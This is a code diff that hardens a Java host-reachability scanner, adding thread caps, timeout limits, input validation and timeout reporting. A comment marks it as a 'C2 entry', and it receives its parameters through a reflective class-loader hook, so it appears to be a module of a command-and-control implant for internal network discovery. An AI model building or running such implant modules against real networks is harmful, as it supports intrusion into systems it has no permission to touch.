@@ -9,6 +9,7 @@ import java.util.List;
 import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
+import java.util.concurrent.TimeUnit;
 
 /**
  * 主机可达性检测组件
@@ -19,6 +20,9 @@ import java.util.concurrent.Executors;
  */
 public class HostIsReachableComponent implements Runnable {
 
+    private static final int MAX_THREADS = 64;
+    private static final int MAX_TIMEOUT_MS = 300000;
+
     private HashMap params;
     private HashMap results;
 
@@ -28,6 +32,7 @@ public class HostIsReachableComponent implements Runnable {
     private List reachableHostList;
     private List unreachableHostList;
     private CountDownLatch latch;
+    private boolean workerMode;
 
     
 
@@ -47,12 +52,13 @@ public class HostIsReachableComponent implements Runnable {
         this.reachableHostList = reachableHostList;
         this.unreachableHostList = unreachableHostList;
         this.latch = latch;
+        this.workerMode = true;
     }
 
     @Override
     public void run() {
         // C2 入口：newInstance() 创建时字段为 null，线程工人构造器会设置字段
-        if (scanHost == null) {
+        if (!workerMode) {
             java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
             try {
                 params = (java.util.HashMap) h.invoke(null, null, null);
@@ -90,20 +96,27 @@ public class HostIsReachableComponent implements Runnable {
      *               - scanTimeout: 检测超时时间，单位毫秒（可选，默认3000）
      */
     private void scanHosts(HashMap params) throws Exception {
-        ArrayList scanHostsList = (ArrayList) params.get("scanHosts");
-        if (scanHostsList == null || scanHostsList.isEmpty()) {
+        Object hostsObj = params.get("scanHosts");
+        if (!(hostsObj instanceof List) || ((List) hostsObj).isEmpty()) {
             throw new IllegalArgumentException("scanHosts参数不能为空");
         }
+        List scanHostsList = (List) hostsObj;
         
         // 转换主机数组
         String[] scanHosts = new String[scanHostsList.size()];
         for (int i = 0; i < scanHostsList.size(); i++) {
-            scanHosts[i] = (String) scanHostsList.get(i);
+            Object hostObj = scanHostsList.get(i);
+            if (hostObj == null || hostObj.toString().trim().length() == 0) {
+                throw new IllegalArgumentException("scanHosts 包含空主机，索引: " + i);
+            }
+            scanHosts[i] = hostObj.toString().trim();
         }
 
         // 获取超时时间，默认3000毫秒
         Object timeoutObj = params.get("scanTimeout");
         int scanTimeout = (timeoutObj instanceof Number) ? ((Number) timeoutObj).intValue() : 3000;
+        if (scanTimeout <= 0) scanTimeout = 3000;
+        if (scanTimeout > MAX_TIMEOUT_MS) scanTimeout = MAX_TIMEOUT_MS;
 
         // 使用线程安全的列表
         List reachableHostList = Collections.synchronizedList(new ArrayList());
@@ -111,7 +124,8 @@ public class HostIsReachableComponent implements Runnable {
 
         // 有多少host就启动多少线程
         int hostCount = scanHosts.length;
-        ExecutorService pool = Executors.newFixedThreadPool(hostCount);
+        int threadCount = Math.min(hostCount, MAX_THREADS);
+        ExecutorService pool = Executors.newFixedThreadPool(threadCount);
         CountDownLatch latch = new CountDownLatch(hostCount);
 
         try {
@@ -123,15 +137,23 @@ public class HostIsReachableComponent implements Runnable {
             }
 
             // 等待所有线程完成
-            latch.await();
+            long batches = (hostCount + threadCount - 1L) / threadCount;
+            long waitMillis = batches * (long) scanTimeout + 5000L;
+            if (waitMillis > MAX_TIMEOUT_MS) waitMillis = MAX_TIMEOUT_MS;
+            boolean completed = latch.await(waitMillis, TimeUnit.MILLISECONDS);
 
             // 返回结果
             results.put("code", 200);
-            results.put("reachableHostList", reachableHostList);
-            results.put("unreachableHostList", unreachableHostList);
+            results.put("reachableHostList", new ArrayList(reachableHostList));
+            results.put("unreachableHostList", new ArrayList(unreachableHostList));
             results.put("totalCount", hostCount);
             results.put("reachableCount", reachableHostList.size());
             results.put("unreachableCount", unreachableHostList.size());
+            results.put("pendingCount", Integer.valueOf((int) latch.getCount()));
+            results.put("timedOut", Boolean.valueOf(!completed));
+            if (!completed) {
+                pool.shutdownNow();
+            }
         } finally {
             // 关闭线程池
             pool.shutdown();
